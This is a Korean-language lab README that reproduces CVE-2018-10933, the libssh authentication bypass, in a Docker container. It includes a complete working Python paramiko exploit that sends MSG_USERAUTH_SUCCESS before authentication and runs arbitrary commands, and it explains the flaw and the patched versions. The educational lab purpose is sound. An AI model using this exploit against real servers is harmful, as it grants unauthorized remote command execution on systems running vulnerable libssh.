# libssh Authentication Bypass Vulnerability(CVE-2018-10933)


**Contributors**
-   [황현택(@hhtboy)](https://github.com/hhtboy)
-   [진규정(@gyutrange)](https://github.com/gyutrange)
-   [이름입력(@hong)](깃허브 주소 입력)

<br/>

### 요약

- 해당 취약점은 libssh에 대한 취약점입니다.
- libssh는 클라이언트와 서버간 SSHv2 프로토콜을 상속받은 멀티플랫폼 C언어 라이브러리입니다. libssh를 사용해서 ssh연결을 해 클라이언트와 서버가 보다 안전한 통신을 할 수 있습니다.
- 이 취약점은 libssh의 서버쪽 state machine에서 발견되었습니다. 공격자는 인증되기도 전에 `MSG_USERAUTH_SUCCESS` 메세지를 보내는 것으로 인증을 우회할 수 있습니다.


### 참고 문서
- https://www.libssh.org/security/advisories/CVE-2018-10933.txt
- https://www.seebug.org/vuldb/ssvid-97614

<br/>

### 환경 구성 및 실행

#### 1. 환경 구성

아래 명령어로 docker 컨테이너 환경을 실행합니다.

```
docker compose up -d
```
<br>

아래 명령어로 컨테이너가 실행중인지 확인합니다.
```
docker ps
```
<br>

![](image/docker_ps.png)
<br>
위와 같이 보인다면 테스트 환경이 정상적으로 구축된것입니다.

#### 2. 정상적인 libssh 시도

컨테이너에는 리눅스 서버가 돌아가고 있습니다.
서버에 접속하기 위해 ssh 연결을 시도합니다.
<br>
계정 : myuser / 비밀번호 : mypassword
<br>
아래 명령어로 ssh 접속을 할 수 있습니다.
(포트번호는 docker-compose파일에 따라 변경합니다.)
```
ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 2222 myuser@localhost
```
<br><br>
비밀번호를 입력해서 정상적인 방법으로 접근이 되는 것을 확인합니다.
![](image/legal_connection.png)

만약 `no matching key exchange method found` 관련 문제가 발생한다면, ~/.ssh/config 파일을 아래와 같이 수정합니다.
```
Host 127.0.0.1
HostKeyAlgorithms=+ssh-rsa
```
![](image/ssh_config.png) 



#### 3. libssh Authentication Bypass 취약점을 이용한 비정상 접근

아래와 같은 `exploit.py`파일을 생성합니다.
```
#!/usr/bin/env python3
import sys
import paramiko
import socket
import logging

logging.basicConfig(stream=sys.stdout, level=logging.DEBUG)
bufsize = 2048


def execute(hostname, port, command):
    sock = socket.socket()
    try:
        # 입력한 호스트 IP, Port 번호로 소켓 연결
        sock.connect((hostname, int(port)))

        # 서버로 보낼 메세지 생성
        message = paramiko.message.Message()
        transport = paramiko.transport.Transport(sock)
        transport.start_client()

        # exploit의 핵심 부분. 메세지에 MSG_USERAUTH_SUCCESS를 추가해서 전송
        message.add_byte(paramiko.common.cMSG_USERAUTH_SUCCESS)
        transport._send_message(message)

        # 입력한 command 실행
        client = transport.open_session(timeout=10)
        client.exec_command(command)

        # 서버에서 실행된 결과를 stdout으로 받아오기
        # stdin = client.makefile("wb", bufsize)
        stdout = client.makefile("rb", bufsize)
        stderr = client.makefile_stderr("rb", bufsize)

        # 결과를 터미널에 출력
        output = stdout.read()
        error = stderr.read()

        stdout.close()
        stderr.close()

        return (output+error).decode()

    # SSH 연결 실패 처리
    except paramiko.SSHException as e:
        logging.exception(e)
        logging.debug("TCPForwarding disabled on remote server can't connect. Not Vulnerable")
    except socket.error:
        logging.debug("Unable to connect.")

    return None


if __name__ == '__main__':
    print(execute(sys.argv[1], sys.argv[2], sys.argv[3]))
```
<br><br>

아래 명령어로 별다른 인증 없이 서버로 명령을 보내고 결과를 받아볼 수 있습니다.
<br/>

`python3 exploit.py 127.0.0.1 [docker에서 설정한 포트] "[실행되길 원하는 명령어]"`
<br/>

```
python3 exploit.py 127.0.0.1 2222 "id"
```

<br/>

### 결과

명령어로 id를 주니 명령어가 실행된 결과가 마지막에 나타납니다.
![](image/result1.png)
<br><br>
명령어로 홈 디렉토리에 새로운 디렉토리를 생성해보았습니다.
![](image/result2.png)
<br><br>
정상적인 방법으로 서버에 접속해서 생성된 디렉토리를 확인할 수 있습니다.
![](image/result3.png)

<br/>

### 정리
정상적인 ssh 연결은 아래와 같은 순서로 이루어집니다.<br>
- 클라이언트가 서버에게 SSH_MSG_USERAUTH_REQUEST를 요청
- 서버는 클라이언트가 보낸 사용자가 유효한지 확인하고, 유효하지 않으면 SSH_MSG_USERAUTH_FAILURE를 보내고, 인증을 받기 위해 SSH_MSG_USERAUTH_REQUEST를 전송함.
- 클라이언트는 인증 방법 중 하나를 선택한 후, 인증 방법과 필요한 값들을 함께 SSH_MSG_USERAUTH_REQUEST를 전송.
- 서버는 클라이언트가 보낸 요청이 유효한지 확인하고, 인증에 성공하면 SSH_MSG_USERAUTH_SUCCESS 메세지를 송신하고 인증을 종료함.

문제는 클라이언트가 SSH_MSG_USERAUTH_REQUEST를 요청한 후 대기중인 상태에서, 서버가 SSH_MSG_USERAUTH_SUCCESS 메세지를 수신하면 정상적으로 인증된 것으로 판단하고 연결이 됩니다.

#### 해결방법

- 취약점이 패치된 libssh 0.8.4와 0.7.6 버전으로 업데이트하여 해결할 수 있습니다.
